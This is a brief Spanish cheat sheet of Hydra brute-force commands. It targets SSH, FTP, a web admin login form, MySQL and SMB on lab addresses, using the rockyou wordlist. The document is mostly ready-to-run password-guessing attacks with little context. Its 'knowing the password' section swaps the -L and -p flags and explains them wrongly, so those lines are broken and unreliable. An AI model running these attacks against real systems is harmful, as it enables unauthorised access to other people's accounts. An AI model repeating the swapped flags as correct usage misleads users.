Esta herramienta sirve para hacer ataques de fuerza bruta a protocolos como ssh o ftp, estos ataques de fuerza bruta se dividen en ataques para conseguir usuarios y ataques para conseguir contraseñas 
**Ataques conociendo el usuario**
```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.15
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.15
```
1. -l ...
	1. El nombre del usuario
2. -P
	1. La ubicación del diccionario del ataque
3. ssh://10.0.2.15
	1. Si atacamos al protocolo ssh
4. ftp://10.0.2.15
	1. Si atacamos al protocolo ftp

**Ataques conociendo la contraseña**
```bash
hydra -L alexis -p /usr/share/metasploit/unix_users.txt ssh://10.0.2.15
hydra -L alexis -p /usr/share/metasploit/unix_users.txt ftp://10.0.2.15
```
1. -L ...
	1. La contraseña que buscamos su usuario
2. -p
	1. La ubicación del diccionario del ataque

**Ataques a paneles de login**
```bash
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 10.0.2.11 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."
```
1. -t ...
	1. Para acelerar el proceso de búsqueda de contraseña
2. http-post-form "..."
	1. Para que hydra sepa como atacar al panel de login web

**Ataques a bases de datos**
```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.15
```

**Ataque al protocolo SMB**
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.0.2.10
```